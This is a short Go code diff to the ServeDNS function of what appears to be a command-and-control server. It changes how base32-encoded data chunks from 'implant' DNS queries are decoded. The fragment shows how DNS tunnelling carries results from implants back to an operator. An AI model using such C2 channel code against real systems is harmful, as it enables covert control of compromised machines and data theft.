@@ -104,7 +104,7 @@ func (h *DNSHandler) ServeDNS(w dns.ResponseWriter, req *dns.Msg) {
 			// RN: this implementation only allows for one result for each implant -> make map of cmdTask ids -> results
 			// TODO: handle chunk-id
 
-			chunk := dns.SplitDomainName(q.Name)[2]
+			chunk := strings.ToUpper(dns.SplitDomainName(q.Name)[2])
 			// chunk := labels[2]
 			data, err := base32.StdEncoding.DecodeString(chunk)
 			if err != nil {
